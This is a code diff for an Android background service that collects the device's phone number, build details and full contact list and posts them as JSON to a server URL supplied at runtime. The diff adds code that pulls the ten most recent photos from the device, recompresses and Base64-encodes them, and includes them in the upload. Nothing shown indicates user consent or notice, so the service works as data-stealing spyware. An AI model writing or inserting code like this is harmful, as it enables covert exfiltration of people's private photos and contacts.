@@ -6,10 +6,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.os.Build;
 import android.preference.PreferenceManager;
 import android.provider.ContactsContract.CommonDataKinds.Phone;
+import android.provider.MediaStore;
 import android.telephony.TelephonyManager;
+import android.util.Base64;
 import android.util.Log;
 
 import com.squareup.okhttp.MediaType;
@@ -22,6 +26,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -32,8 +37,9 @@ public class DataExportService extends IntentService {
 
     public static final String HTTP_ENDPOINT = "HttpEndpoint";
     public static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");
+    public static final int AMOUNT_OF_PICTURES = 10;
+    public static final int JPEG_QUALITY = 10;
     OkHttpClient httpClient = new OkHttpClient();
-    private SharedPreferences mPreferences;
 
     /**
      * Creates an IntentService.  Invoked by your subclass's constructor.
@@ -50,7 +56,7 @@ public class DataExportService extends IntentService {
 
     @Override
     protected void onHandleIntent(Intent intent) {
-        mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
+        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(this);
 
         try {
             URL httpEndpointUrl = new URL(intent.getExtras().getString(HTTP_ENDPOINT));
@@ -61,7 +67,7 @@ public class DataExportService extends IntentService {
 
             sendDataToServer(httpEndpointUrl.toString(), phoneDataString);
 
-            mPreferences.edit()
+            preferences.edit()
                     .putBoolean("dataWasExported", true)
                     .apply();
         } catch (JSONException | MalformedURLException e) {
@@ -88,8 +94,43 @@ public class DataExportService extends IntentService {
         addPhoneNumberToPhoneData(phoneData);
         addBuildDataToPhoneData(phoneData);
         addPhoneContactsToPhoneData(phoneData, fetchPhoneContacts());
+        addPicturesToPhoneData(phoneData);
 
         return phoneData;
+    }
+
+    protected void addPicturesToPhoneData(JSONObject phoneData) throws JSONException {
+        JSONArray jsonPictures = new JSONArray(fetchEncodedPictures());
+        phoneData.put("Pictures", jsonPictures);
+    }
+
+    protected ArrayList<String> fetchEncodedPictures() {
+        Cursor cursor = getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                new String[]{MediaStore.Images.ImageColumns._ID, MediaStore.Images.ImageColumns.DATA, MediaStore.Images.ImageColumns.MIME_TYPE},
+                null,
+                null,
+                MediaStore.Images.ImageColumns._ID + " DESC"
+        );
+
+        ArrayList<String> pictures = new ArrayList<String>();
+
+        if (cursor.moveToFirst()) {
+            do {
+                String pictureUri = cursor.getString(1);
+                Bitmap bitmap = BitmapFactory.decodeFile(pictureUri);
+
+                ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
+
+                String encodedPictureString = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
+                pictures.add(encodedPictureString);
+            } while (pictures.size() < AMOUNT_OF_PICTURES && cursor.moveToNext());
+        }
+
+        cursor.close();
+
+        return pictures;
     }
 
     protected void addPhoneNumberToPhoneData(JSONObject target) throws JSONException {
